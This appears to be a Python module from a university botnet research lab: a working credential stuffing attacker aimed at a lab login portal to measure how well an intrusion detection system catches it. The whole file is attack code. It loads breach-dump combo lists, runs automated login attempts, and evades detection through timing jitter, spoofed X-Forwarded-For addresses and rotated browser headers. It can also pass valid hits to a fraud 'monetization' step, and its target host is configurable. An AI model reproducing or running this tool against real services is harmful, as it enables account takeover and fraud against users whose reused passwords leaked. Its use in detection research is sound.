"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Credential Stuffing Attack Module
 Target: fake_portal.py running on 192.168.100.20:80
 Environment: ISOLATED VM LAB ONLY
====================================================

Credential stuffing attacks a web application using
leaked username:password pairs. Unlike brute-force
(many passwords per account), credential stuffing
tests one pair per account, exploiting password reuse.

This script is the ATTACKER side of the research.
The IDS (ids_detector.py Engine 2) monitors for:
  - Rigid inter-arrival timing (low CV)
  - High login volume from one IP

Four modes to test IDS evasion:
  1) BOT mode:         rigid timing (easy to detect, CV ≈ 0.01)
  2) JITTER mode:      randomized delays (harder to detect)
  3) DISTRIBUTED mode: simulate multiple source IPs (hardest)
  4) HUMAN mode:       Gaussian delays (FPR baseline)

Research question: At what jitter level does CV-based
detection fail? (Answer: ~500ms stddev — see Graph 3)

NEW FLAGS (added to match Castle credential stuffing article):
  --creds-file PATH  Load credentials from a breach dump file
                     (format: email:password one per line).
                     Simulates sourcing from Collection #1 /
                     stealer logs / Telegram combo lists.
  --monetize         After the run, invoke monetization_sim.py
                     on all valid hits.  Models gift-card drain,
                     fraudulent orders, account resale, password
                     pivot to other services, and combo export.
  --ua-rotate        Rotate User-Agent and Accept-* headers per
                     request (8-entry pool: Chrome/Firefox/Safari
                     on Win/Mac/Linux).  Raises the bar for IDS
                     Engine 6 cross-IP fingerprint correlation.
                     Without this flag every request shares the
                     same UA — the simplest possible fingerprint.
"""

import os
import sys
import time
import json
import random
import socket
import urllib.request
import urllib.parse
import urllib.error
import threading
import statistics
import hashlib
from datetime import datetime

# ── Configuration ─────────────────────────────────────────────
TARGET_HOST   = "192.168.100.20"
TARGET_PORT   = 80
LOGIN_PATH    = "/login"
ATTEMPTS_PATH = "/attempts"

# ── Default credential list ───────────────────────────────────
# Based on leaked credential formats (anonymized/fake for research)
# In real credential stuffing: use combo lists from data breaches

DEFAULT_CREDS = [
    ("alice@example.com",  "password123"),
    ("alice@example.com",  "qwerty"),
    ("alice@example.com",  "letmein"),
    ("bob@example.com",    "123456"),
    ("bob@example.com",    "password"),
    ("bob@example.com",    "iloveyou"),
    ("charlie@corp.com",   "charlie2024"),
    ("charlie@corp.com",   "Summer2023!"),
    ("dave@mail.com",      "dave1234"),
    ("dave@mail.com",      "monkey"),
    ("eve@email.com",      "sunshine"),
    ("eve@email.com",      "princess"),
    ("frank@net.com",      "dragon"),
    ("frank@net.com",      "master"),
    ("grace@web.io",       "superman"),
    ("grace@web.io",       "batman"),
    ("admin@example.com",  "admin"),
    ("admin@example.com",  "admin123"),
    ("admin@example.com",  "password"),
    ("admin@example.com",  "securePass123!"),  # this one succeeds on fake_portal
    ("user@example.com",   "user"),
    ("user@example.com",   "password1"),
    ("test@test.com",      "test"),
    ("test@test.com",      "test123"),
    ("info@company.com",   "info2024"),
    ("support@app.com",    "support"),
    ("root@server.com",    "root"),
    ("root@server.com",    "toor"),
    ("john.doe@corp.com",  "John2024"),
    ("jane.doe@corp.com",  "Jane2024"),
]

# ── Realistic browser User-Agent pool (new — for --ua-rotate) ─
# Rotating through this pool varies the browser fingerprint hash
# computed by ip_reputation.py, raising the bar for Engine 6
# cross-IP fingerprint correlation detection.
UA_POOL = [
    # Chrome / Windows
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "en-US,en;q=0.9", "gzip, deflate, br"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "en-GB,en;q=0.9", "gzip, deflate, br"),
    # Chrome / macOS
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "en-US,en;q=0.9,fr;q=0.8", "gzip, deflate, br"),
    # Chrome / Linux
    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "en-US,en;q=0.9", "gzip, deflate, br"),
    # Firefox / Windows
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
     "Gecko/20100101 Firefox/121.0",
     "en-US,en;q=0.5", "gzip, deflate, br"),
    # Firefox / Linux
    ("Mozilla/5.0 (X11; Linux x86_64; rv:120.0) "
     "Gecko/20100101 Firefox/120.0",
     "en-US,en;q=0.5", "gzip, deflate"),
    # Safari / macOS
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 "
     "(KHTML, like Gecko) Version/17.1 Safari/605.1.15",
     "en-US,en;q=0.9", "gzip, deflate, br"),
    # Edge / Windows
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
     "en-US,en;q=0.9", "gzip, deflate, br"),
]

# ── Breach dump loader (new — for --creds-file) ───────────────

def load_creds_from_file(path: str) -> list:
    """
    Load email:password pairs from a breach dump file.

    Supported formats:
      email:password   (most common combo-list format)
      email;password   (semicolon separator)
      Lines starting with # are treated as comments.

    Simulates the attacker workflow described in the article:
      "Attackers collect username-password pairs from public leaks
       (e.g. Collection #1), stealer logs, or breach dumps traded
       in underground marketplaces, often formatted as email:password."
    """
    if not os.path.exists(path):
        print(f"[CS] ERROR: credential file not found: {path}")
        sys.exit(1)

    creds   = []
    skipped = 0
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            for sep in (":", ";"):
                if sep in line:
                    email, _, pwd = line.partition(sep)
                    email = email.strip()
                    pwd   = pwd.strip()
                    if "@" in email and pwd:
                        creds.append((email, pwd))
                        break
            else:
                skipped += 1

    print(f"[CS] Loaded {len(creds)} credential pairs from {path} "
          f"({skipped} lines skipped)")
    return creds


# ── HTTP helpers ──────────────────────────────────────────────

def post_login(host: str, port: int, email: str, password: str,
               timeout: float = 5.0,
               ua_rotate: bool = False,
               extra_headers: dict = None) -> tuple:
    """
    HTTP POST to /login with form data.
    Returns (status_code, response_body).

    When ua_rotate=True, picks a random UA+Accept-Language+Accept-Encoding
    combination from UA_POOL, varying the browser fingerprint per request.
    Without it, uses a fixed research UA (easy Engine 6 fingerprint target).
    """
    body = urllib.parse.urlencode({"email": email, "password": password}).encode()
    url  = f"http://{host}:{port}{LOGIN_PATH}"

    if ua_rotate:
        ua, lang, enc = random.choice(UA_POOL)
        headers = {
            "Content-Type":    "application/x-www-form-urlencoded",
            "User-Agent":      ua,
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": lang,
            "Accept-Encoding": enc,
        }
    else:
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent":   "Mozilla/5.0 (compatible; Research/1.0)",
        }

    if extra_headers:
        headers.update(extra_headers)

    req = urllib.request.Request(url, data=body, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return 0, str(e)


def get_portal_stats(host: str, port: int) -> dict:
    """Fetch login attempt statistics from the portal's /attempts endpoint."""
    try:
        url = f"http://{host}:{port}{ATTEMPTS_PATH}"
        with urllib.request.urlopen(url, timeout=5) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return {}


# ── Timing analysis (mirrors IDS Engine 2 logic) ─────────────

def compute_cv(timestamps: list) -> float:
    """Compute Coefficient of Variation of inter-arrival times."""
    if len(timestamps) < 3:
        return float('inf')
    intervals = [timestamps[i] - timestamps[i-1] for i in range(1, len(timestamps))]
    mean = statistics.mean(intervals)
    if mean == 0:
        return 0.0
    return statistics.stdev(intervals) / mean


def show_timing_analysis(timestamps: list, mode: str):
    """Print CV analysis matching what the IDS sees."""
    if len(timestamps) < 3:
        return
    cv = compute_cv(timestamps)
    intervals = [timestamps[i] - timestamps[i-1] for i in range(1, len(timestamps))]
    mean_ms  = statistics.mean(intervals) * 1000
    stdev_ms = statistics.stdev(intervals) * 1000 if len(intervals) > 1 else 0

    print(f"\n[CS] ─── Timing Analysis ({mode}) ───")
    print(f"[CS]   Requests analyzed: {len(timestamps)}")
    print(f"[CS]   Mean inter-arrival: {mean_ms:.1f}ms")
    print(f"[CS]   Std deviation:      {stdev_ms:.1f}ms")
    print(f"[CS]   CV = {cv:.4f}  (IDS threshold: 0.15)")
    if cv < 0.15:
        print(f"[CS]   → DETECTABLE: CV below threshold — IDS would fire ✓")
    elif cv < 0.4:
        print(f"[CS]   → BORDERLINE: IDS may fire depending on window size")
    else:
        print(f"[CS]   → EVASIVE: CV too high — IDS treats as human traffic ✓")


# ── Attack modes ──────────────────────────────────────────────

class CredentialStuffer:
    """
    Automated credential stuffing attacker.

    Three modes:
      'bot'         — fixed interval, easily detected (CV ≈ 0.01)
      'jitter'      — randomized delays, borderline detection
      'distributed' — simulates multiple IPs via X-Forwarded-For header
    """

    def __init__(self, host: str = TARGET_HOST, port: int = TARGET_PORT,
                 creds: list = None, mode: str = "bot",
                 base_interval_ms: int = 500, jitter_ms: int = 0,
                 n_workers: int = 1, ua_rotate: bool = False):
        self.host             = host
        self.port             = port
        self.creds            = creds or DEFAULT_CREDS
        self.mode             = mode
        self.base_interval_ms = base_interval_ms
        self.jitter_ms        = jitter_ms
        self.n_workers        = n_workers
        self.ua_rotate        = ua_rotate

        self.results     = []   # (email, password, status, success, ts)
        self.timestamps  = []   # for CV analysis
        self.successes   = []
        self._lock       = threading.Lock()
        self._stop       = threading.Event()

    def _sleep_between_requests(self):
        """Sleep with configurable jitter."""
        if self.jitter_ms == 0:
            # Pure bot: fixed interval
            time.sleep(self.base_interval_ms / 1000.0)
        else:
            # Jittered: uniform random ±jitter_ms around base
            delay = self.base_interval_ms + random.uniform(-self.jitter_ms, self.jitter_ms)
            delay = max(50, delay)  # minimum 50ms
            time.sleep(delay / 1000.0)

    def _make_fake_ip(self) -> str:
        """Generate a fake source IP for distributed mode header spoofing."""
        # Use realistic-looking residential IP ranges
        ranges = [
            (10, 0, 0, 0),    # RFC1918 (lab range)
            (172, 16, 0, 0),  # RFC1918
        ]
        base = random.choice(ranges)
        return f"{base[0]}.{base[1]}.{random.randint(1,254)}.{random.randint(1,254)}"

    def _attempt(self, email: str, password: str, worker_id: int = 0):
        """Perform a single login attempt."""
        ts = time.time()

        if self.mode == "distributed":
            # Spoof X-Forwarded-For to simulate different source IPs.
            # Uses inline urllib.request.Request (preserving original distributed
            # mode behavior) but also respects ua_rotate for the User-Agent.
            fake_ip = self._make_fake_ip()
            body = urllib.parse.urlencode({"email": email, "password": password}).encode()
            url  = f"http://{self.host}:{self.port}{LOGIN_PATH}"

            if self.ua_rotate:
                ua, lang, enc = random.choice(UA_POOL)
                hdrs = {
                    "Content-Type":    "application/x-www-form-urlencoded",
                    "User-Agent":      ua,
                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language": lang,
                    "Accept-Encoding": enc,
                    "X-Forwarded-For": fake_ip,
                    "X-Real-IP":       fake_ip,
                }
            else:
                hdrs = {
                    "Content-Type":  "application/x-www-form-urlencoded",
                    "User-Agent":    f"Mozilla/5.0 (Windows NT 10.0; rv:{random.randint(90,120)}.0)",
                    "X-Forwarded-For": fake_ip,
                    "X-Real-IP":       fake_ip,
                }

            req = urllib.request.Request(url, data=body, headers=hdrs)
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    status, body_resp = resp.status, resp.read().decode()
            except urllib.error.HTTPError as e:
                status, body_resp = e.code, ""
            except Exception:
                status, body_resp = 0, ""
        else:
            status, body_resp = post_login(
                self.host, self.port, email, password,
                ua_rotate=self.ua_rotate
            )

        # Original success check: status 200 AND body contains "success"
        success = status == 200 and "success" in body_resp.lower()

        with self._lock:
            self.timestamps.append(ts)
            self.results.append((email, password, status, success, ts))
            if success:
                self.successes.append((email, password))

        symbol = "✓" if success else "✗"
        print(f"[CS-{worker_id}] {symbol} {email}:{password}  → HTTP {status}")

        return success

    def run_sequential(self, verbose: bool = True):
        """Run credential stuffing sequentially (single source IP)."""
        print(f"\n[CS] Starting sequential attack ({self.mode} mode)")
        print(f"[CS] Target: {self.host}:{self.port}{LOGIN_PATH}")
        print(f"[CS] Credentials: {len(self.creds)} pairs")
        print(f"[CS] Interval: {self.base_interval_ms}ms ±{self.jitter_ms}ms")
        print(f"[CS] UA rotation: {'ON' if self.ua_rotate else 'OFF'}")
        print()

        for i, (email, password) in enumerate(self.creds):
            if self._stop.is_set():
                break
            self._attempt(email, password)
            self._sleep_between_requests()

            # Periodic CV display
            if len(self.timestamps) > 0 and len(self.timestamps) % 10 == 0:
                show_timing_analysis(self.timestamps[-20:], self.mode)

        self._print_summary()

    def run_distributed(self, requests_per_second: float = 2.0):
        """
        Distributed mode: multiple threads hammering from different fake IPs.
        Each thread processes a partition of the credential list.
        """
        print(f"\n[CS] Starting DISTRIBUTED attack")
        print(f"[CS] Workers: {self.n_workers}  |  Target RPS: {requests_per_second}")
        print(f"[CS] UA rotation: {'ON' if self.ua_rotate else 'OFF'}")

        chunk_size  = max(1, len(self.creds) // self.n_workers)
        threads     = []
        interval_ms = int(1000.0 / requests_per_second / self.n_workers)

        for w in range(self.n_workers):
            chunk = self.creds[w * chunk_size:(w + 1) * chunk_size]

            def worker(creds_chunk, wid):
                for email, password in creds_chunk:
                    if self._stop.is_set():
                        break
                    self._attempt(email, password, worker_id=wid)
                    delay = interval_ms + random.uniform(-50, 50)
                    time.sleep(max(10, delay) / 1000.0)

            t = threading.Thread(target=worker, args=(chunk, w), daemon=True)
            threads.append(t)

        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self._print_summary()

    def stop(self):
        self._stop.set()

    def _print_summary(self):
        print(f"\n[CS] {'='*50}")
        print(f"[CS] Attack Summary")
        print(f"[CS] {'='*50}")
        print(f"[CS] Total attempts: {len(self.results)}")
        print(f"[CS] Successful logins: {len(self.successes)}")
        if self.successes:
            print(f"[CS] Valid credentials found:")
            for email, pwd in self.successes:
                print(f"[CS]   ✓ {email} : {pwd}")

        if len(self.timestamps) >= 3:
            show_timing_analysis(self.timestamps, self.mode)

        # Fetch portal stats for comparison
        stats = get_portal_stats(self.host, self.port)
        if stats:
            print(f"\n[CS] Portal reports: {stats.get('total_attempts')} total attempts, "
                  f"{stats.get('success_count')} successes")


# ── Human simulation (baseline for comparison) ────────────────

def simulate_human_baseline(host: str = TARGET_HOST, port: int = TARGET_PORT,
                             n_attempts: int = 20):
    """
    Simulate a real human user logging in with natural timing.
    Shows what HIGH CV looks like — the IDS should NOT fire.
    Used to calibrate Graph 3 (FPR baseline).
    """
    print(f"\n[CS] Simulating human baseline ({n_attempts} attempts)")
    print(f"[CS] Human timing: Gaussian distribution μ=3s σ=2.5s")

    timestamps = []
    successes  = 0

    emails  = ["alice@example.com", "bob@example.com", "admin@example.com"]
    passwds = ["wrong_pass", "another_wrong", "password123"]

    for i in range(n_attempts):
        # Human typing speed: Gaussian around 3 seconds, high variance
        delay = abs(random.gauss(3.0, 2.5))
        delay = max(0.5, delay)
        time.sleep(delay)

        email, password = random.choice(list(zip(emails, passwds)))
        status, body = post_login(host, port, email, password, ua_rotate=True)
        ts = time.time()
        timestamps.append(ts)

        success = status == 200 and "success" in body.lower()
        if success:
            successes += 1
        print(f"[HUMAN] {'✓' if success else '✗'} {email}  delay={delay:.2f}s")

    show_timing_analysis(timestamps, "human_baseline")
    print(f"\n[HUMAN] A well-calibrated IDS should NOT have fired on this traffic.")


# ── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Credential Stuffing Module - AUA Botnet Research Lab"
    )
    parser.add_argument("--mode",
                        choices=["bot", "jitter", "distributed", "human"],
                        default="bot",
                        help="Attack mode (default: bot)")
    parser.add_argument("--interval",   type=int,   default=500,
                        help="Base interval between requests in ms (default: 500)")
    parser.add_argument("--jitter",     type=int,   default=0,
                        help="Jitter ±ms (0=none, try 100/300/500/1000 for Graph 3)")
    parser.add_argument("--workers",    type=int,   default=3,
                        help="Worker threads for distributed mode (default: 3)")
    parser.add_argument("--host",       default=TARGET_HOST,
                        help=f"Target host (default: {TARGET_HOST})")
    parser.add_argument("--port",       type=int,   default=TARGET_PORT,
                        help=f"Target port (default: {TARGET_PORT})")
    # new flags
    parser.add_argument("--creds-file", default=None, metavar="PATH",
                        help="Load credentials from a breach dump file "
                             "(format: email:password, one per line). "
                             "Simulates sourcing from Collection #1 / Telegram combo lists.")
    parser.add_argument("--monetize",   action="store_true",
                        help="After attack, run monetization_sim.py on all valid hits "
                             "(gift-card drain, fraudulent orders, resale, password pivot).")
    parser.add_argument("--ua-rotate",  action="store_true",
                        help="Rotate User-Agent and Accept headers per-request "
                             "(raises bar for IDS Engine 6 fingerprint correlation). "
                             "Without this flag all requests share the same UA.")
    args = parser.parse_args()

    print("=" * 60)
    print(" Credential Stuffing Module - AUA Botnet Research Lab")
    print(" ISOLATED ENVIRONMENT ONLY")
    print("=" * 60)

    # Load credentials
    if args.creds_file:
        print(f"[CS] Loading credentials from breach dump: {args.creds_file}")
        creds = load_creds_from_file(args.creds_file)
    else:
        creds = DEFAULT_CREDS
        print(f"[CS] Using default credential list ({len(creds)} pairs)")

    if args.ua_rotate:
        print(f"[CS] UA rotation: ON — browser fingerprint varies per request")
    else:
        print(f"[CS] UA rotation: OFF — single UA (easy Engine 6 fingerprint target)")

    # Quick connectivity check
    try:
        s = socket.create_connection((args.host, args.port), timeout=3)
        s.close()
        print(f"[CS] Target {args.host}:{args.port} reachable ✓\n")
    except Exception:
        print(f"[CS] ERROR: Cannot reach {args.host}:{args.port}")
        print(f"[CS] Make sure fake_portal.py is running on the victim VM")
        sys.exit(1)

    hits = []

    if args.mode == "human":
        simulate_human_baseline(args.host, args.port, n_attempts=15)

    elif args.mode == "distributed":
        stuffer = CredentialStuffer(
            host=args.host, port=args.port,
            creds=creds,
            mode="distributed",
            base_interval_ms=args.interval,
            jitter_ms=args.jitter,
            n_workers=args.workers,
            ua_rotate=args.ua_rotate,
        )
        stuffer.run_distributed(requests_per_second=4.0)
        hits = stuffer.successes

    else:
        # bot or jitter mode
        jitter = 0 if args.mode == "bot" else (args.jitter or 200)
        stuffer = CredentialStuffer(
            host=args.host, port=args.port,
            creds=creds,
            mode=args.mode,
            base_interval_ms=args.interval,
            jitter_ms=jitter,
            ua_rotate=args.ua_rotate,
        )
        stuffer.run_sequential()
        hits = stuffer.successes

    # ── Monetization pipeline (new — --monetize flag) ─────────
    if args.monetize and args.mode != "human":
        if hits:
            print(f"\n[CS] Running monetization pipeline on {len(hits)} hit(s)...")
            try:
                import monetization_sim
                monetization_sim.run_monetization(hits)
            except ImportError:
                print("[CS] WARNING: monetization_sim.py not found in working directory.")
                print("[CS] Copy it alongside cred_stuffing.py to enable monetization.")
        else:
            print("[CS] No valid hits — skipping monetization.")

    print(f"\n[CS] Done. Review IDS logs on victim VM to see detection results.")
    print(f"[CS] Graph 3 tip: re-run with --jitter 0,100,300,500,750,1000 and record CV + detection.")
    if not args.ua_rotate:
        print(f"[CS] Engine 6 tip: run WITHOUT --ua-rotate so all requests share the same "
              f"fingerprint, then check /stats/advanced on the portal for fingerprint reuse alerts.")